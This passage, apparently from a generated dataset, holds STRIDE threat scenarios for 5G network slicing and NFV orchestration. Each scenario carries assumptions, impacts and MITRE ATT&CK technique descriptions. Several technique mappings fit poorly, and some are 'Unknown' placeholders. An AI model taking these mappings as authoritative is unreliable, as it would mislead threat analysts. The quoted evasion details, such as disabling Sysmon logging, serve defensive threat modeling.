                    "Assumption": "Monitoring systems do not identify and mitigate flood attacks.",
                    "Role": "System Admin",
                    "Condition": "Valid if monitoring is inadequate."
                }
            ],
            "Potential Impact": "Service disruption and degradation of network slice performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flood attack",
                "traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious code inserted in VNFs causes resource exhaustion.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not sufficiently protected against code injection.",
                    "Role": "System Designer",
                    "Condition": "Valid if no protection mechanisms are in place."
                },
                {
                    "Assumption": "The attacker has the capability to inject malicious code.",
                    "Role": "Attacker",
                    "Condition": "Valid with appropriate exploits."
                },
                {
                    "Assumption": "No monitoring of resource utilization within VNFs.",
                    "Role": "System Admin",
                    "Condition": "Valid if resource utilization is unmonitored."
                }
            ],
            "Potential Impact": "Exhaustion of resources leading to VNF and service crashes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malicious code",
                "resource exhaustion",
                "VNF"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Manipulation of orchestration system to deallocate critical resources from network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has control over or can manipulate the orchestration system.",
                    "Role": "Attacker",
                    "Condition": "Valid with compromised orchestration system."
                },
                {
                    "Assumption": "The orchestration system lacks checks for unauthorized deallocation of resources.",
                    "Role": "System Designer",
                    "Condition": "Valid if checks are missing."
                },
                {
                    "Assumption": "No fallback mechanisms in place for critical resource allocation.",
                    "Role": "System Admin",
                    "Condition": "Valid without fallback mechanisms."
                }
            ],
            "Potential Impact": "Deprivation of critical resources, leading to service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration system",
                "resource deallocation",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in VNFs to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "VNFs have vulnerabilities that allow privilege escalation.",
                    "Role": "System Designer",
                    "Condition": "Valid with unpatched vulnerabilities."
                },
                {
                    "Assumption": "The attacker has access to a compromised VNF.",
                    "Role": "Attacker",
                    "Condition": "Valid if any VNF is compromised."
                },
                {
                    "Assumption": "No continuous vulnerability management for VNFs.",
                    "Role": "System Admin",
                    "Condition": "Valid if vulnerability management is lacking."
                }
            ],
            "Potential Impact": "Unauthorized control over network slices and critical data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "VNF",
                "vulnerabilities",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Component Object Model",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
                "technique_id": "T1559.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised edge computing node allows attacker to gain control over resources at the edge.",
            "Assumptions": [
                {
                    "Assumption": "Edge computing nodes are not adequately secured.",
                    "Role": "System Designer",
                    "Condition": "Valid with weak security measures."
                },
                {
                    "Assumption": "The attacker has gained access to an edge node.",
                    "Role": "Attacker",
                    "Condition": "Valid through physical or logical access."
                },
                {
                    "Assumption": "No effective segregation of duties in edge node management.",
                    "Role": "System Admin",
                    "Condition": "Valid if management duties are not segregated."
                }
            ],
            "Potential Impact": "Control over edge resources, leading to data breaches and service manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "edge computing",
                "node control",
                "resource management"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates NFVO to gain elevated privileges and orchestrate malicious tasks.",
            "Assumptions": [
                {
                    "Assumption": "NFVO has vulnerabilities that can be exploited.",
                    "Role": "System Designer",
                    "Condition": "Valid if software vulnerabilities are present."
                },
                {
                    "Assumption": "The attacker can access NFVO controls.",
                    "Role": "Attacker",
                    "Condition": "Valid with access to NFVO."
                },
                {
                    "Assumption": "No multi-factor authentication for NFVO access.",
                    "Role": "System Admin",
                    "Condition": "Valid if MFA is not implemented."
                }
            ],
            "Potential Impact": "Unauthorized orchestration of network slices, leading to widespread disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "NFVO",
                "orchestration control",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate network function to gain unauthorized access to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to some credentials or network information.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of network functions or weak protective measures."
                },
                {
                    "Assumption": "Network functions rely on mutual authentication which can be bypassed.",
                    "Role": "Network Administrator",
                    "Condition": "Current authentication methods are not sufficiently robust."
                }
            ],
            "Potential Impact": "Unauthorized access can lead to data breaches and unauthorized control over network resources.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network function"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious user pretends to be a legitimate user to access sensitive data within a network slice.",
            "Assumptions": [
                {
                    "Assumption": "Weak or flawed authentication methods are employed.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of multi-factor authentication."
                },
                {
                    "Assumption": "The network does not sufficiently verify the authenticity of user credentials.",
                    "Role": "System Architect",
                    "Condition": "Inadequate verification processes."
                }
            ],
            "Potential Impact": "Sensitive data is exposed to unauthorized individuals, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "user impersonation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker exploits a vulnerability in the orchestration and management layer to impersonate the NFVO.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of a specific vulnerability within the NFVO.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability has been discovered but not yet patched."
                },
                {
                    "Assumption": "The NFVO does not have adequate security measures in place.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate security configurations or patches."
                }
            ],
            "Potential Impact": "Control over network slice management, potentially leading to disruption of services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "orchestration",
                "management layer",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters configuration settings of network functions (NFs) to degrade service reliability.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised access to the network functions.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or exploited vulnerabilities."
                },
                {
                    "Assumption": "Configuration management does not include integrity validation checks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of configuration management controls."
                }
            ],
            "Potential Impact": "Data integrity is compromised, affecting the reliability and performance of the network.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration changes",
                "service degradation"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious insider changes VNFs to deploy rogue services within network slices.",
            "Assumptions": [
                {
                    "Assumption": "An insider has administrative access to VNFs.",
                    "Role": "Malicious Insider",
                    "Condition": "Access to the VNF management interface."
                },
                {
                    "Assumption": "No monitoring is in place to detect unauthorized changes.",
                    "Role": "Security Administrator",
                    "Condition": "Insufficient logging and monitoring."
                }
            ],
            "Potential Impact": "Service integrity is compromised, possibly allowing backdoors or data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "tampering",
                "virtual machine",
                "service manipulation"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies orchestration scripts to disrupt network slice instantiation and configuration.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has write access to orchestration scripts.",
                    "Role": "Attacker",
                    "Condition": "Weak access controls on orchestration scripts."
                },
                {
                    "Assumption": "Orchestration scripts are not adequately protected or verified.",
                    "Role": "Network Administrator",
                    "Condition": "Scripts are stored without proper safeguards."
                }
            ],
            "Potential Impact": "Service deployment and configuration processes are disrupted, leading to availability issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "script modification",
                "orchestration disruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker conducts actions within the network slices that evade logging mechanisms, making traceability difficult.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are insufficient or improperly configured.",
                    "Role": "Security Administrator",
                    "Condition": "Inadequate logging practices."
                },
                {
                    "Assumption": "The attacker is aware of the weaknesses in the logging mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Well-informed attacker."
                }
            ],
            "Potential Impact": "Difficulty in incident response and forensic investigation, leading to challenges in attributing malicious actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log evasion",
                "network slices"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies actions taken on the orchestration and management platform, claiming legitimate activity.",
            "Assumptions": [
                {
                    "Assumption": "The platform lacks detailed and tamper-proof logging.",
                    "Role": "Network Administrator",
                    "Condition": "Logs are not tamper-evident or encrypted."
                },
                {
                    "Assumption": "User roles and actions are not meticulously recorded.",
                    "Role": "Application Developer",
                    "Condition": "Roles and actions are insufficiently captured."
                }
            ],
            "Potential Impact": "Log integrity is compromised, making it hard to resolve disputes and track unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "orchestration",
                "management platform"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user executes unauthorized configurations on edge computing nodes without leaving an audit trail.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes lack adequate auditing and monitoring solutions.",
                    "Role": "Network Administrator",
                    "Condition": "Edge nodes are not properly monitored."
                },
                {
                    "Assumption": "There is no effective mechanism to verify user activity.",
                    "Role": "System Architect",
                    "Condition": "Missing or weak auditing mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized configurations cannot be traced back to the perpetrator, complicating incident investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "edge computing",
                "unauthorized configuration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted during transmission between network functions due to weak encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not sufficiently encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Weak or incorrect encryption protocols."
                },
                {
                    "Assumption": "An attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network interception tools or access."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality, exposing sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "weak encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to VNFs with readable sensitive logs.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive information is exposed in VNF logs.",
                    "Role": "System Developer",
                    "Condition": "Logs contain sensitive data."
                },
                {
                    "Assumption": "The attacker has access to VNF log files.",
                    "Role": "Attacker",
                    "Condition": "Compromised or inappropriate access permissions."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data, causing privacy and security breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "log files",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Vulnerabilities in external interfaces lead to data leaks from network slices.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are inadequately secured.",
                    "Role": "Network Administrator",
                    "Condition": "Weak interface security protocols."
                },
                {
                    "Assumption": "The attacker has the means to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of exploitable weaknesses."
                }
            ],
            "Potential Impact": "Sensitive data leakage impacting user privacy and operational confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interfaces",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with excessive traffic, overwhelming network slices and causing service outages.",
            "Assumptions": [
                {
                    "Assumption": "The network does not have adequate rate limiting or DoS mitigation measures.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of or insufficient DoS defenses."
                },
                {
                    "Assumption": "The attacker can generate a large volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or large-scale attack tools."
                }
            ],
            "Potential Impact": "Service availability is disrupted, causing outages and degraded performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "network slices"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting a vulnerability in the NFVO, an attacker disrupts the orchestration function, preventing new network slices from being created.",
            "Assumptions": [
                {
                    "Assumption": "The NFVO contains a known or unknown vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and exploitation of the vulnerability."
                },
                {
                    "Assumption": "The attacker has access to disrupt the NFVO functions.",
                    "Role": "Attacker",
                    "Condition": "Network access or exploiting a related vulnerability."
                }
            ],
            "Potential Impact": "Service provisioning and resource allocation are halted, affecting overall service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "NFVO",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
